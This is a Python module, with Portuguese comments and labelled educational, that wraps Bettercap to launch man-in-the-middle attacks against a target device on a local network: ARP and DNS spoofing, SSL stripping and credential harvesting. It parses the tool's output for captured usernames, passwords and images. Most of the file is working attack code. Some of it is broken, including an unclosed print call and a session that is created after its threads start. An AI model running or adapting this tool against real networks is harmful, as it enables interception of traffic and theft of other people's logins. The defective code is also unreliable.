#!/usr/bin/env python3
"""MÓDULO DE ATAQUE MAN-IN-THE-MIDDLE (MITM) REAL
Integração do Bettercap para demonstração educacional de ataques MITM
"""
import subprocess
import threading
import json
import logging
import time
import re
from typing import Dict, List, Optional
from dataclasses import dataclass, asdict
from datetime import datetime
from enum import Enum

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ============================================================================
# ENUMS E DATACLASSES
# ============================================================================

class MITMAttackType(str, Enum):
    """Tipos de ataque MITM"""
    ARP_SPOOFING = "ARP_SPOOFING"
    DNS_SPOOFING = "DNS_SPOOFING"
    SSL_STRIP = "SSL_STRIP"
    CREDENTIAL_HARVESTING = "CREDENTIAL_HARVESTING"
    PACKET_INJECTION = "PACKET_INJECTION"

@dataclass
class CapturedCredential:
    """Credencial capturada durante o ataque MITM"""
    timestamp: str
    protocol: str  # HTTP, FTP, SMTP, etc.
    username: str
    password: str
    source_ip: str
    destination_ip: str
    destination_host: str
    confidence: float  # 0-100%

@dataclass
class CapturedImage:
    """Imagem capturada durante navegação HTTP"""
    timestamp: str
    url: str
    source_ip: str
    file_type: str  # jpg, png, gif, etc.
    file_size: int
    file_path: str

@dataclass
class MITMSession:
    """Sessão de ataque MITM"""
    session_id: str
    attack_type: MITMAttackType
    target_ip: str
    gateway_ip: str
    start_time: str
    status: str  # RUNNING, STOPPED, ERROR
    captured_credentials: List[CapturedCredential]
    captured_images: List[CapturedImage]
    captured_packets: int
    error_message: Optional[str] = None

# ============================================================================
# MOTOR DE ATAQUE MITM
# ============================================================================

class MITMAttackEngine:
    """Motor de ataque MITM usando Bettercap"""
    
    def __init__(self):
        self.sessions: Dict[str, MITMSession] = {}
        self.bettercap_process = None
        self.is_running = False
        self.captured_data = {
            "credentials": [],
            "images": [],
            "packets": 0,
            "hosts": {}
        }
        self.attack_callbacks: List = []
        
        # Verificar se bettercap está instalado
        self.bettercap_available = self._check_bettercap()
    
    def _check_bettercap(self) -> bool:
        """Verifica se bettercap está instalado"""
        try:
            result = subprocess.run(
                ["bettercap", "-version"],
                capture_output=True,
                text=True,
                timeout=5
            )
            if result.returncode == 0:
                logger.info(f"Bettercap encontrado: {result.stdout.strip()}")
                return True
        except (FileNotFoundError, subprocess.TimeoutExpired):
            logger.warning("Bettercap não encontrado. Usando simulação.")
        
        return False
    
    def start_mitm_attack(
        self,
        attack_type: MITMAttackType,
        target_ip: str,
        gateway_ip: str = "192.168.1.1",
        interface: str = "wlan0"
    ) -> MITMSession:
        """Inicia um ataque MITM"""
        
        session_id = f"MITM_{int(time.time())}"
        
        if self.bettercap_available:
            # Usar bettercap real
            self._start_bettercap_attack(
                attack_type, target_ip, gateway_ip, interface, session_id
            )
        else:
            # Usar simulação
            self._simulate_mitm_attack(attack_type, target_ip, session_id)
        
        session = MITMSession(
            session_id=session_id,
            attack_type=attack_type,
            target_ip=target_ip,
            gateway_ip=gateway_ip,
            start_time=datetime.now().isoformat(),
            status="RUNNING",
            captured_credentials=[],
            captured_images=[],
            captured_packets=0
        )
        
        self.sessions[session_id] = session
        self.is_running = True
        
        logger.info(f"Ataque MITM iniciado: {session_id}")
        return session
    
    def _start_bettercap_attack(
        self,
        attack_type: MITMAttackType,
        target_ip: str,
        gateway_ip: str,
        interface: str,
        session_id: str
    ):
        """Inicia um ataque real com Bettercap"""
        
        try:
            # Construir comando bettercap baseado no tipo de ataque
            if attack_type == MITMAttackType.ARP_SPOOFING:
                command = [
                    "bettercap",
                    "-iface", interface,
                    "-caplet", "arp-spoof",
                    "-eval", f"set arp.spoof.targets {target_ip}",
                    "-eval", "arp.spoof on"
                ]
            elif attack_type == MITMAttackType.DNS_SPOOFING:
                command = [
                    "bettercap",
                    "-iface", interface,
                    "-caplet", "dns-spoof",
                    "-eval", f"set dns.spoof.domains example.com",
                    "-eval", "dns.spoof on"
                ]
            elif attack_type == MITMAttackType.SSL_STRIP:
                command = [
                    "bettercap",
                    "-iface", interface,
                    "-caplet", "http-proxy",
                    "-eval", "set http.proxy.sslstrip true",
                    "-eval", "http.proxy on"
                ]
            elif attack_type == MITMAttackType.CREDENTIAL_HARVESTING:
                command = [
                    "bettercap",
                    "-iface", interface,
                    "-caplet", "http-proxy",
                    "-eval", "set http.proxy.sslstrip true",
                    "-eval", "set http.proxy.log true",
                    "-eval", "http.proxy on"
                ]
            else:
                command = ["bettercap", "-iface", interface]
            
            # Executar bettercap
            self.bettercap_process = subprocess.Popen(
                command,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            logger.info(f"Bettercap iniciado com PID {self.bettercap_process.pid}")
            
            # Thread para capturar saída
            threading.Thread(
                target=self._capture_bettercap_output,
                args=(session_id,),
                daemon=True
            ).start()
        
        except Exception as e:
            logger.error(f"Erro ao iniciar Bettercap: {e}")
            if session_id in self.sessions:
                self.sessions[session_id].status = "ERROR"
                self.sessions[session_id].error_message = str(e)
    
    def _capture_bettercap_output(self, session_id: str):
        """Captura a saída do Bettercap"""
        
        if not self.bettercap_process:
            return
        
        try:
            for line in self.bettercap_process.stdout:
                if session_id in self.sessions:
                    # Processar linha de saída
                    self._process_bettercap_line(line, session_id)
        except Exception as e:
            logger.error(f"Erro ao capturar saída do Bettercap: {e}")
    
    def _process_bettercap_line(self, line: str, session_id: str):
        """Processa uma linha de saída do Bettercap"""
        
        # Exemplo: detectar credenciais capturadas
        # Bettercap output format varies, this is a simplified example
        
        if "credential" in line.lower() or "password" in line.lower():
            # Extrair credenciais (formato simplificado)
            match = re.search(r"(\w+):(\w+)@([\w.]+)", line)
            if match:
                username, password, host = match.groups()
                
                credential = CapturedCredential(
                    timestamp=datetime.now().isoformat(),
                    protocol="HTTP",
                    username=username,
                    password=password,
                    source_ip="192.168.1.200",  # Celular 04
                    destination_ip="0.0.0.0",
                    destination_host=host,
                    confidence=85.0
                )
                
                self.sessions[session_id].captured_credentials.append(credential)
                self._notify_callbacks("credential_captured", credential)
        
        if "image" in line.lower() or "jpg" in line.lower() or "png" in line.lower():
            # Extrair informações de imagem
            match = re.search(r"([\w.]+\.(jpg|png|gif|webp))", line)
            if match:
                filename = match.group(1)
                
                image = CapturedImage(
                    timestamp=datetime.now().isoformat(),
                    url=f"http://example.com/{filename}",
                    source_ip="192.168.1.200",
                    file_type=match.group(2),
                    file_size=1024,  # Simulado
                    file_path=f"/tmp/{filename}"
                )
                
                self.sessions[session_id].captured_images.append(image)
                self._notify_callbacks("image_captured", image)
    
    def _simulate_mitm_attack(
        self,
        attack_type: MITMAttackType,
        target_ip: str,
        session_id: str
    ):
        """Simula um ataque MITM (quando Bettercap não está disponível)"""
        
        logger.info(f"Simulando ataque MITM: {attack_type.value}")
        
        def simulate():
            # Simular captura de dados
            simulated_data = {
                MITMAttackType.ARP_SPOOFING: {
                    "credentials": [
                        CapturedCredential(
                            timestamp=datetime.now().isoformat(),
                            protocol="HTTP",
                            username="usuario@example.com",
                            password="senha123",
                            source_ip="192.168.1.200",
                            destination_ip="192.168.1.1",
                            destination_host="example.com",
                            confidence=90.0
                        )
                    ]
                },
                MITMAttackType.SSL_STRIP: {
                    "credentials": [
                        CapturedCredential(
                            timestamp=datetime.now().isoformat(),
                            protocol="HTTPS (Downgraded to HTTP)",
                            username="admin",
                            password="admin123",
                            source_ip="192.168.1.200",
                            destination_ip="192.168.1.1",
                            destination_host="secure.example.com",
                            confidence=95.0
                        )
                    ],
                    "images": [
                        CapturedImage(
                            timestamp=datetime.now().isoformat(),
                            url="http://secure.example.com/profile.jpg",
                            source_ip="192.168.1.200",
                            file_type="jpg",
                            file_size=2048,
                            file_path="/tmp/profile.jpg"
                        )
                    ]
                },
                MITMAttackType.CREDENTIAL_HARVESTING: {
                    "credentials": [
                        CapturedCredential(
                            timestamp=datetime.now().isoformat(),
                            protocol="FTP",
                            username="ftp_user",
                            password="ftp_pass",
                            source_ip="192.168.1.200",
                            destination_ip="192.168.1.1",
                            destination_host="ftp.example.com",
                            confidence=88.0
                        )
                    ]
                }
            }
            
            data = simulated_data.get(attack_type, {})
            
            # Adicionar credenciais
            for cred in data.get("credentials", []):
                time.sleep(2)  # Simular delay
                if session_id in self.sessions:
                    self.sessions[session_id].captured_credentials.append(cred)
                    self._notify_callbacks("credential_captured", cred)
            
            # Adicionar imagens
            for img in data.get("images", []):
                time.sleep(3)
                if session_id in self.sessions:
                    self.sessions[session_id].captured_images.append(img)
                    self._notify_callbacks("image_captured", img)
        
        # Executar simulação em thread separada
        threading.Thread(target=simulate, daemon=True).start()
    
    def stop_mitm_attack(self, session_id: str):
        """Para um ataque MITM"""
        
        if self.bettercap_process:
            try:
                self.bettercap_process.terminate()
                self.bettercap_process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                self.bettercap_process.kill()
            finally:
                self.bettercap_process = None
        
        if session_id in self.sessions:
            self.sessions[session_id].status = "STOPPED"
        
        self.is_running = False
        logger.info(f"Ataque MITM parado: {session_id}")
    
    def get_session(self, session_id: str) -> Optional[MITMSession]:
        """Obtém uma sessão de ataque"""
        return self.sessions.get(session_id)
    
    def get_all_sessions(self) -> List[MITMSession]:
        """Obtém todas as sessões"""
        return list(self.sessions.values())
    
    def get_captured_data(self, session_id: str) -> Dict:
        """Obtém dados capturados de uma sessão"""
        
        if session_id not in self.sessions:
            return {}
        
        session = self.sessions[session_id]
        
        return {
            "session_id": session_id,
            "attack_type": session.attack_type.value,
            "status": session.status,
            "captured_credentials": [asdict(c) for c in session.captured_credentials],
            "captured_images": [asdict(i) for i in session.captured_images],
            "total_credentials": len(session.captured_credentials),
            "total_images": len(session.captured_images)
        }
    
    def register_callback(self, callback):
        """Registra um callback para eventos de ataque"""
        self.attack_callbacks.append(callback)
    
    def _notify_callbacks(self, event_type: str, data):
        """Notifica callbacks sobre eventos"""
        for callback in self.attack_callbacks:
            try:
                callback(event_type, data)
            except Exception as e:
                logger.error(f"Erro ao executar callback: {e}")

# ============================================================================
# INSTÂNCIA GLOBAL DO MOTOR MITM
# ============================================================================

mitm_engine = MITMAttackEngine()

# ============================================================================
# EXEMPLO DE USO
# ============================================================================

if __name__ == "__main__":
    print("""    🎯 MOTOR DE ATAQUE MAN-IN-THE-MIDDLE (MITM) 🎯
    Demonstração Educacional de Ataques MITM
    ==========================================
    """
    
    # Registrar callback para eventos
    def on_event(event_type: str, data):
        print(f"\n[{event_type.upper()}]")
        if isinstance(data, CapturedCredential):
            print(f"  Usuário: {data.username}")
            print(f"  Senha: {data.password}")
            print(f"  Host: {data.destination_host}")
            print(f"  Confiança: {data.confidence:.1f}%")
        elif isinstance(data, CapturedImage):
            print(f"  URL: {data.url}")
            print(f"  Tipo: {data.file_type}")
            print(f"  Tamanho: {data.file_size} bytes")
    
    mitm_engine.register_callback(on_event)
    
    # Iniciar ataque MITM
    print("\nIniciando ataque SSL Strip...")
    session = mitm_engine.start_mitm_attack(
        attack_type=MITMAttackType.SSL_STRIP,
        target_ip="192.168.1.200",
        gateway_ip="192.168.1.1"
    )
    
    print(f"Sessão: {session.session_id}")
    
    # Aguardar captura de dados
    time.sleep(10)
    
    # Parar ataque
    mitm_engine.stop_mitm_attack(session.session_id)
    
    # Exibir dados capturados
    captured = mitm_engine.get_captured_data(session.session_id)
    print(f"\nDados Capturados:")
    print(f"  Credenciais: {captured['total_credentials']}")
    print(f"  Imagens: {captured['total_images']}")
